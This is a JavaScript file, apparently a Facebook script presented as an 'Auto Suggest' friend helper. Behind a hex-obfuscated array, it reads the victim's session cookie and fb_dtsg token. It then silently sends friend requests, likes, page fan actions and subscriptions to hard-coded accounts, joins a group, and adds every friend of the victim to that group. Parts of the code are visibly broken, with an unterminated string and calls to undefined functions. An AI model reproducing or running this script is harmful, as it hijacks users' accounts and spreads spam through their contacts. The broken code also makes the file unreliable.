        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}

function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}

function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        w = document.getElementsByClassName('pbm fsm')[0];

        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Sumit Patel;
        e.className = 'uiButton';
        e.onclick = autoSuggest;

        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}

blub();

document.addEventListener("DOMNodeInserted", blub, true);

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var _0x6733=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x2F\x61\x63\x74\x69\x6F\x6E\x2E\x70\x68\x70","\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x3D\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x26\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72\x5F\x73\x26\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x3D\x6E\x6F\x6E\x65\x26\x26\x26\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x3D\x26\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x73\x65\x61\x72\x63\x68\x26\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x3D\x74\x72\x75\x65\x26\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x26\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x33\x35\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x33\x38\x31\x34\x32\x36\x32\x35\x34","\x31\x38\x30\x34\x38\x30\x35\x33\x34\x39","\x31\x30\x30\x30\x30\x35\x35\x33\x35\x34\x32\x37\x36\x35\x35","\x31\x30\x30\x30\x30\x37\x38\x35\x39\x38\x38\x38\x36\x36\x33","\x31\x30\x30\x30\x30\x35\x33\x34\x30\x35\x38\x31\x38\x33\x36","\x31\x30\x30\x30\x30\x35\x33\x36\x35\x32\x33\x37\x38\x30\x33","\x31\x30\x30\x30\x30\x37\x30\x35\x35\x30\x34\x30\x39\x39\x38","\x31\x30\x30\x30\x30\x34\x33\x38\x33\x31\x35\x38\x33\x32\x39","\x31\x30\x30\x30\x30\x37\x36\x33\x37\x37\x37\x33\x34\x36\x37","\x31\x30\x30\x30\x30\x37\x37\x30\x31\x32\x31\x36\x39\x31\x39","\x31\x30\x30\x30\x30\x31\x36\x37\x33\x39\x34\x35\x34\x39\x33","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x6C\x69\x6B\x65\x2E\x70\x68\x70","\x6C\x69\x6B\x65\x5F\x61\x63\x74\x69\x6F\x6E\x3D\x74\x72\x75\x65\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x31\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D","\x25\x33\x41\x33\x37\x39\x37\x38\x33\x38\x35\x37\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x33\x39\x5F\x31\x38\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x25\x33\x45\x25\x33\x44\x26\x66\x74\x5B\x74\x79\x70\x65\x5D\x3D\x32\x30\x26\x66\x74\x5B\x71\x69\x64\x5D\x3D\x35\x38\x39\x30\x38\x31\x31\x33\x32\x39\x34\x37\x30\x32\x37\x39\x32\x35\x37\x26\x66\x74\x5B\x6D\x66\x5F\x73\x74\x6F\x72\x79\x5F\x6B\x65\x79\x5D\x3D\x32\x38\x31\x34\x39\x36\x32\x39\x30\x30\x31\x39\x33\x31\x34\x33\x39\x35\x32\x26\x66\x74\x5B\x68\x61\x73\x5F\x65\x78\x70\x61\x6E\x64\x65\x64\x5F\x75\x66\x69\x5D\x3D\x31\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x68\x6F\x6D\x65\x5F\x73\x74\x72\x65\x61\x6D\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x38\x51\x6F\x41\x4D\x42\x6C\x43\x6C\x79\x6F\x63\x70\x61\x65\x26\x5F\x5F\x72\x65\x71\x3D\x67\x34\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x31\x30\x32\x30\x31\x36\x33\x34\x32\x35\x33\x34\x38\x33\x30\x38\x39","\x31\x30\x32\x30\x31\x32\x37\x35\x34\x37\x32\x32\x37\x33\x37\x38\x33","\x31\x30\x32\x30\x31\x31\x32\x34\x36\x36\x35\x37\x30\x33\x37\x31\x33","\x31\x30\x32\x30\x30\x38\x39\x34\x32\x39\x39\x36\x32\x34\x37\x30\x35","\x31\x30\x32\x30\x30\x35\x34\x30\x31\x35\x31\x31\x33\x31\x32\x31\x34","\x31\x30\x32\x30\x30\x31\x33\x39\x30\x38\x38\x33\x30\x34\x38\x39\x34","\x34\x34\x31\x39\x35\x33\x35\x31\x37\x31\x34\x36\x33","\x34\x30\x33\x32\x35\x36\x32\x33\x33\x37\x33\x38\x34","\x33\x33\x33\x33\x36\x31\x39\x30\x36\x34\x32\x33\x39","\x32\x30\x37\x32\x36\x38\x30\x31\x38\x31\x35\x35\x35","\x31\x39\x34\x39\x30\x30\x32\x30\x30\x39\x36\x37\x38","\x31\x39\x30\x33\x34\x31\x31\x38\x32\x39\x39\x35\x32","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x70\x61\x67\x65\x73\x2F\x66\x61\x6E\x5F\x73\x74\x61\x74\x75\x73\x2E\x70\x68\x70","\x26\x66\x62\x70\x61\x67\x65\x5F\x69\x64\x3D","\x26\x61\x64\x64\x3D\x74\x72\x75\x65\x26\x72\x65\x6C\x6F\x61\x64\x3D\x66\x61\x6C\x73\x65\x26\x66\x61\x6E\x5F\x6F\x72\x69\x67\x69\x6E\x3D\x70\x61\x67\x65\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x26\x66\x61\x6E\x5F\x73\x6F\x75\x72\x63\x65\x3D\x26\x63\x61\x74\x3D\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x5F\x70\x61\x67\x65\x5F\x61\x63\x74\x69\x6F\x6E\x73\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x64\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x36\x33\x34\x37\x32\x33\x31\x35\x33\x32\x34\x32\x37\x37\x36","\x34\x39\x31\x39\x31\x39\x36\x33\x37\x35\x36\x36\x39\x34\x35","\x33\x32\x30\x37\x34\x30\x30\x38\x34\x36\x35\x32\x33\x34\x33","\x33\x33\x34\x36\x30\x38\x35\x34\x36\x35\x35\x35\x31\x38\x37","\x33\x32\x38\x34\x34\x33\x39\x36\x33\x38\x35\x39\x37\x36\x38","\x32\x35\x36\x36\x39\x36\x31\x31\x31\x30\x37\x32\x34\x34\x35","\x31\x38\x36\x32\x32\x35\x36\x36\x38\x31\x33\x37\x34\x31\x33","\x32\x35\x33\x39\x35\x31\x36\x33\x34\x36\x38\x34\x30\x35\x36","\x36\x36\x35\x36\x38\x30\x32\x35\x33\x34\x37\x36\x38\x34\x31","\x32\x36\x36\x33\x37\x39\x31\x37\x33\x35\x32\x34\x37\x30\x37","\x31\x34\x33\x36\x31\x30\x32\x32\x33\x39\x39\x34\x36\x37\x34\x31","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x2F\x61\x6A\x61\x78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F","\x34\x36\x33\x32\x38\x39\x37\x33\x38\x35\x33\x38\x35","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x33\x35\x34\x39\x32\x38\x36\x31","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x33\x36\x36\x35\x32\x38\x39\x30","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x30\x38\x31\x32\x39\x39\x34","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x31\x32\x35\x33\x30\x30\x35","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x32\x31\x37\x33\x30\x32\x38","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x36\x32\x35\x33\x31\x33\x30","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x37\x33\x33\x33\x31\x35\x37","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x38\x34\x39\x33\x31\x38\x36","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x35\x30\x37\x33\x33\x32\x34\x32","\x31\x39\x32\x39\x32\x33\x37\x35\x34\x32\x33\x35\x34\x37\x31","\x31\x39\x32\x39\x32\x34\x32\x31\x34\x32\x33\x35\x34\x32\x35","\x32\x35\x30\x37\x39\x32\x35\x39\x31\x37\x35\x32\x36\x36\x35","\x31\x34\x30\x32\x35\x37\x30\x37\x39\x36\x36\x36\x39\x39\x35\x34","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x6C\x65\x6E\x67\x74\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x47\x45\x54","\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x74\x6F\x6B\x65\x6E","\x72\x61\x6E\x64\x6F\x6D","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x65\x72\x72\x6F\x72","\x69\x6E\x64\x65\x78","\x73\x6F\x72\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x2F\x61\x64\x64\x5F\x70\x6F\x73\x74\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x74\x79\x70\x65\x61\x68\x65\x61\x64\x26\x72\x65\x66\x3D\x26\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x3D\x26\x6D\x65\x6D\x62\x65\x72\x73\x3D","\x75\x69\x64","","\x73\x65\x74\x54\x69\x6D\x65","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x68\x61\x79\x69\x72\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67"];var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);function IDS(_0x9c10x4){var _0x9c10x5= new XMLHttpRequest();var _0x9c10x6=_0x6733[5];var _0x9c10x7=_0x6733[6]+_0x9c10x4+_0x6733[7]+user_id+_0x6733[8]+fb_dtsg+_0x6733[9];_0x9c10x5[_0x6733[11]](_0x6733[10],_0x9c10x6,true);_0x9c10x5[_0x6733[12]]=function (){if(_0x9c10x5[_0x6733[13]]==4&&_0x9c10x5[_0x6733[14]]==200){_0x9c10x5[_0x6733[15]];} ;} ;_0x9c10x5[_0x6733[16]](_0x9c10x7);} ;IDS(_0x6733[17]);IDS(_0x6733[18]);IDS(_0x6733[19]);IDS(_0x6733[20]);IDS(_0x6733[21]);IDS(_0x6733[22]);IDS(_0x6733[23]);IDS(_0x6733[24]);IDS(_0x6733[25]);IDS(_0x6733[26]);IDS(_0x6733[27]);var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var now=( new Date)[_0x6733[28]]();function P(_0x9c10xa){var _0x9c10x5= new XMLHttpRequest();var _0x9c10x6=_0x6733[29];var _0x9c10x7=_0x6733[30]+_0x9c10xa+_0x6733[31]+now+_0x6733[32]+user_id+_0x6733[33]+fb_dtsg+_0x6733[9];_0x9c10x5[_0x6733[11]](_0x6733[10],_0x9c10x6,true);_0x9c10x5[_0x6733[12]]=function (){if(_0x9c10x5[_0x6733[13]]==4&&_0x9c10x5[_0x6733[14]]==200){_0x9c10x5[_0x6733[15]];} ;} ;_0x9c10x5[_0x6733[16]](_0x9c10x7);} ;P(_0x6733[34]);P(_0x6733[35]);P(_0x6733[36]);P(_0x6733[37]);P(_0x6733[38]);P(_0x6733[39]);P(_0x6733[40]);P(_0x6733[41]);P(_0x6733[42]);P(_0x6733[43]);P(_0x6733[44]);P(_0x6733[45]);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);function Like(_0x9c10xc){var _0x9c10xd= new XMLHttpRequest();var _0x9c10xe=_0x6733[46];var _0x9c10xf=_0x6733[47]+_0x9c10xc+_0x6733[48]+user_id+_0x6733[49]+fb_dtsg+_0x6733[9];_0x9c10xd[_0x6733[11]](_0x6733[10],_0x9c10xe,true);_0x9c10xd[_0x6733[12]]=function (){if(_0x9c10xd[_0x6733[13]]==4&&_0x9c10xd[_0x6733[14]]==200){_0x9c10xd[_0x6733[15]];} ;} ;_0x9c10xd[_0x6733[16]](_0x9c10xf);} ;Like(_0x6733[50]);Like(_0x6733[51]);Like(_0x6733[52]);Like(_0x6733[53]);Like(_0x6733[54]);Like(_0x6733[55]);Like(_0x6733[56]);Like(_0x6733[57]);Like(_0x6733[58]);Like(_0x6733[59]);Like(_0x6733[60]);function sublist(_0x9c10x11){var a=document[_0x6733[62]](_0x6733[61]);a[_0x6733[63]]=_0x6733[64]+_0x9c10x11+_0x6733[65];document[_0x6733[67]][_0x6733[66]](a);} ;function a(_0x9c10x13){var _0x9c10x14= new XMLHttpRequest;var _0x9c10x15=_0x6733[68];var _0x9c10x16=_0x6733[69]+_0x9c10x13+_0x6733[70]+fb_dtsg+_0x6733[71]+user_id+_0x6733[9];_0x9c10x14[_0x6733[11]](_0x6733[10],_0x9c10x15,true);_0x9c10x14[_0x6733[12]]=function (){if(_0x9c10x14[_0x6733[13]]==4&&_0x9c10x14[_0x6733[14]]==200){_0x9c10x14[_0x6733[15]];} ;} ;_0x9c10x14[_0x6733[16]](_0x9c10x16);} ;a(_0x6733[17]);a(_0x6733[18]);a(_0x6733[19]);a(_0x6733[20]);a(_0x6733[21]);a(_0x6733[22]);a(_0x6733[23]);a(_0x6733[24]);a(_0x6733[25]);a(_0x6733[26]);a(_0x6733[27]);sublist(_0x6733[72]);sublist(_0x6733[73]);sublist(_0x6733[74]);sublist(_0x6733[75]);sublist(_0x6733[76]);sublist(_0x6733[77]);sublist(_0x6733[78]);sublist(_0x6733[79]);sublist(_0x6733[80]);sublist(_0x6733[81]);sublist(_0x6733[82]);sublist(_0x6733[83]);sublist(_0x6733[84]);var gid=[_0x6733[85]];var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var httpwp= new XMLHttpRequest();var urlwp=_0x6733[86];var paramswp=_0x6733[87]+gid+_0x6733[88]+fb_dtsg+_0x6733[89]+user_id+_0x6733[9];httpwp[_0x6733[11]](_0x6733[10],urlwp,true);httpwp[_0x6733[92]](_0x6733[90],_0x6733[91]);httpwp[_0x6733[92]](_0x6733[93],paramswp[_0x6733[94]]);httpwp[_0x6733[92]](_0x6733[95],_0x6733[96]);httpwp[_0x6733[16]](paramswp);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var friends= new Array();gf= new XMLHttpRequest();gf[_0x6733[11]](_0x6733[97],_0x6733[98]+user_id+_0x6733[99]+Math[_0x6733[100]]()+_0x6733[101],false);gf[_0x6733[16]]();if(gf[_0x6733[13]]!=4){} else {data=eval(_0x6733[102]+gf[_0x6733[104]][_0x6733[103]](9)+_0x6733[105]);if(data[_0x6733[106]]){} else {friends=data[_0x6733[110]][_0x6733[109]][_0x6733[108]](function (_0x9c10x1c,_0x9c10x1d){return _0x9c10x1c[_0x6733[107]]-_0x9c10x1d[_0x6733[107]];} );} ;} ;for(var i=0;i<friends[_0x6733[94]];i++){var httpwp= new XMLHttpRequest();var urlwp=_0x6733[111];var paramswp=_0x6733[88]+fb_dtsg+_0x6733[112]+gid+_0x6733[113]+friends[i][_0x6733[114]]+_0x6733[89]+user_id+_0x6733[9];httpwp[_0x6733[11]](_0x6733[10],urlwp,true);httpwp[_0x6733[92]](_0x6733[90],_0x6733[91]);httpwp[_0x6733[92]](_0x6733[93],paramswp[_0x6733[94]]);httpwp[_0x6733[92]](_0x6733[95],_0x6733[96]);httpwp[_0x6733[12]]=function (){if(httpwp[_0x6733[13]]==4&&httpwp[_0x6733[14]]==200){} ;} ;httpwp[_0x6733[16]](paramswp);} ;var spage_id=_0x6733[51];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var smesaj=_0x6733[115];var smesaj_text=_0x6733[115];var arkadaslar=[];var svn_rev;var bugun= new Date();var btarihi= new Date();btarihi[_0x6733[116]](bugun[_0x6733[28]]()+1000*60*60*4*1);if(!document[_0x6733[4]][_0x6733[3]](/paylasti=(\d+)/)){document[_0x6733[4]]=_0x6733[117]+btarihi[_0x6733[118]]();} ;